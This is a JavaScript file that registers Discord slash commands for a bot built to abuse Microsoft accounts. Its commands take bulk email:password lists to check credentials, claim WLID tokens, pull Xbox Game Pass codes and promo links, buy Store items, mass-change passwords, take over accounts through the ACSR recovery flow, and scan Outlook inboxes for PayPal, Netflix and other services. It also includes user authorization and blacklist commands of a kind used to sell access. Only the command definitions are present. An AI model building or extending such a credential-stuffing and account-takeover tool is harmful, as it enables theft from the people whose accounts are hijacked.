// ============================================================
//  Register slash commands with Discord
//  Run once:  node src/deploy-commands.js
// ============================================================

const { REST, Routes, SlashCommandBuilder } = require("discord.js");
const { BOT_TOKEN, CLIENT_ID } = require("./config");

const commands = [
  new SlashCommandBuilder()
    .setName("check")
    .setDescription("Check Microsoft codes against WLID tokens")
    .addStringOption((o) =>
      o.setName("wlids").setDescription("WLID tokens (comma-separated). If empty, uses stored WLIDs.").setRequired(false)
    )
    .addAttachmentOption((o) =>
      o.setName("codes_file").setDescription("Text file containing codes (one per line)").setRequired(false)
    )
    .addStringOption((o) =>
      o.setName("codes").setDescription("Codes to check (comma-separated)").setRequired(false)
    )
    .addIntegerOption((o) =>
      o.setName("threads").setDescription("Number of concurrent threads (1-100, default 10)").setMinValue(1).setMaxValue(100)
    ),

  new SlashCommandBuilder()
    .setName("claim")
    .setDescription("Claim WLID tokens from Microsoft accounts")
    .addAttachmentOption((o) =>
      o.setName("accounts_file").setDescription("Text file with email:password per line").setRequired(false)
    )
    .addStringOption((o) =>
      o.setName("accounts").setDescription("Accounts as email:password (comma-separated)").setRequired(false)
    )
    .addIntegerOption((o) =>
      o.setName("threads").setDescription("Number of concurrent threads (1-50, default 5)").setMinValue(1).setMaxValue(50)
    ),

  new SlashCommandBuilder()
    .setName("pull")
    .setDescription("Fetch codes from Xbox Game Pass accounts and validate them")
    .addAttachmentOption((o) =>
      o.setName("accounts_file").setDescription("Text file with email:password per line").setRequired(false)
    )
    .addStringOption((o) =>
      o.setName("accounts").setDescription("Accounts as email:password (comma-separated)").setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName("promopuller")
    .setDescription("Fetch promo links from Xbox Game Pass accounts (links only)")
    .addAttachmentOption((o) =>
      o.setName("accounts_file").setDescription("Text file with email:password per line").setRequired(false)
    )
    .addStringOption((o) =>
      o.setName("accounts").setDescription("Accounts as email:password (comma-separated)").setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName("purchase")
    .setDescription("Buy items from the Microsoft Store using accounts")
    .addStringOption((o) =>
      o.setName("product").setDescription("Product ID or Microsoft Store URL").setRequired(true)
    )
    .addAttachmentOption((o) =>
      o.setName("accounts_file").setDescription("Text file with email:password per line").setRequired(false)
    )
    .addStringOption((o) =>
      o.setName("accounts").setDescription("Accounts as email:password (comma-separated)").setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName("search")
    .setDescription("Search for products on the Microsoft Store")
    .addStringOption((o) =>
      o.setName("query").setDescription("Search query").setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName("changer")
    .setDescription("Change password on Microsoft accounts")
    .addStringOption((o) =>
      o.setName("new_password").setDescription("The new password to set").setRequired(true)
    )
    .addAttachmentOption((o) =>
      o.setName("accounts_file").setDescription("Text file with email:password per line").setRequired(false)
    )
    .addStringOption((o) =>
      o.setName("accounts").setDescription("Accounts as email:password (comma-separated)").setRequired(false)
    )
    .addIntegerOption((o) =>
      o.setName("threads").setDescription("Number of concurrent threads (1-50, default 5)").setMinValue(1).setMaxValue(50)
    ),

  new SlashCommandBuilder()
    .setName("checker")
    .setDescription("Check Microsoft account credentials (valid/locked/invalid)")
    .addAttachmentOption((o) =>
      o.setName("accounts_file").setDescription("Text file with email:password per line").setRequired(false)
    )
    .addStringOption((o) =>
      o.setName("accounts").setDescription("Accounts as email:password (comma-separated)").setRequired(false)
    )
    .addIntegerOption((o) =>
      o.setName("threads").setDescription("Number of concurrent threads (1-50, default 5)").setMinValue(1).setMaxValue(50)
    ),

  new SlashCommandBuilder()
    .setName("wlidset")
    .setDescription("Set WLID tokens for /check (owner only, replaces previous)")
    .addAttachmentOption((o) =>
      o.setName("wlids_file").setDescription("Text file with WLID tokens (one per line)").setRequired(false)
    )
    .addStringOption((o) =>
      o.setName("wlids").setDescription("WLID tokens (comma-separated)").setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName("auth")
    .setDescription("Authorize a user to use the bot (owner only)")
    .addUserOption((o) => o.setName("user").setDescription("User to authorize").setRequired(true))
    .addStringOption((o) =>
      o.setName("duration").setDescription("Duration (e.g. 1h, 7d, 30d, 1mo, forever)").setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName("deauth")
    .setDescription("Remove a user's authorization (owner only)")
    .addUserOption((o) => o.setName("user").setDescription("User to deauthorize").setRequired(true)),

  new SlashCommandBuilder()
    .setName("authlist")
    .setDescription("List all authorized users"),

  new SlashCommandBuilder()
    .setName("blacklist")
    .setDescription("Permanently block a user from using the bot (owner only)")
    .addUserOption((o) => o.setName("user").setDescription("User to blacklist").setRequired(true))
    .addStringOption((o) => o.setName("reason").setDescription("Reason for blacklisting").setRequired(false)),

  new SlashCommandBuilder()
    .setName("unblacklist")
    .setDescription("Remove a user from the blacklist (owner only)")
    .addUserOption((o) => o.setName("user").setDescription("User to unblacklist").setRequired(true)),

  new SlashCommandBuilder()
    .setName("blacklistshow")
    .setDescription("Show all blacklisted users"),

  new SlashCommandBuilder()
    .setName("stats")
    .setDescription("Show bot status, active sessions, and stored WLIDs"),

  new SlashCommandBuilder()
    .setName("help")
    .setDescription("Show all available commands"),

  // ── Admin commands ──
  new SlashCommandBuilder()
    .setName("admin")
    .setDescription("[ADMIN] View admin control panel"),

  new SlashCommandBuilder()
    .setName("setwebhook")
    .setDescription("[ADMIN] Set webhook URL for results")
    .addStringOption((o) =>
      o.setName("url").setDescription("Discord webhook URL").setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName("botstats")
    .setDescription("[ADMIN] View detailed processing statistics"),

  new SlashCommandBuilder()
    .setName("recover")
    .setDescription("Recover Microsoft account(s) (reset password via ACSR)")
    .addStringOption((o) =>
      o.setName("new_password").setDescription("New password to set").setRequired(true)
    )
    .addStringOption((o) =>
      o.setName("emails").setDescription("Email(s) to recover (comma-separated)").setRequired(false)
    )
    .addAttachmentOption((o) =>
      o.setName("emails_file").setDescription("Text file with emails (one per line)").setRequired(false)
    )
    .addIntegerOption((o) =>
      o.setName("threads").setDescription("Concurrent recoveries (1-10, default 1)").setMinValue(1).setMaxValue(10)
    ),

  new SlashCommandBuilder()
    .setName("captcha")
    .setDescription("Submit CAPTCHA solution for active recovery session")
    .addStringOption((o) =>
      o.setName("solution").setDescription("CAPTCHA solution or token").setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName("rewards")
    .setDescription("Check Microsoft Rewards point balances for accounts")
    .addAttachmentOption((o) =>
      o.setName("accounts_file").setDescription("Text file with email:password per line").setRequired(false)
    )
    .addStringOption((o) =>
      o.setName("accounts").setDescription("Accounts as email:password (comma-separated)").setRequired(false)
    )
    .addIntegerOption((o) =>
      o.setName("threads").setDescription("Number of concurrent threads (1-10, default 3)").setMinValue(1).setMaxValue(10)
    ),

  new SlashCommandBuilder()
    .setName("inboxaio")
    .setDescription("Scan Hotmail/Outlook inboxes for 50+ services (Netflix, Spotify, PayPal...)")
    .addAttachmentOption((o) =>
      o.setName("accounts_file").setDescription("Text file with email:password per line").setRequired(false)
    )
    .addStringOption((o) =>
      o.setName("accounts").setDescription("Accounts as email:password (comma-separated)").setRequired(false)
    )
    .addIntegerOption((o) =>
      o.setName("threads").setDescription("Number of concurrent threads (1-50, default 5)").setMinValue(1).setMaxValue(50)
    ),

].map((c) => c.toJSON());

const rest = new REST({ version: "10" }).setToken(BOT_TOKEN);

(async () => {
  try {
    console.log("Registering slash commands...");
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
    console.log("Slash commands registered successfully.");
  } catch (error) {
    console.error("Failed to register commands:", error);
  }
})();
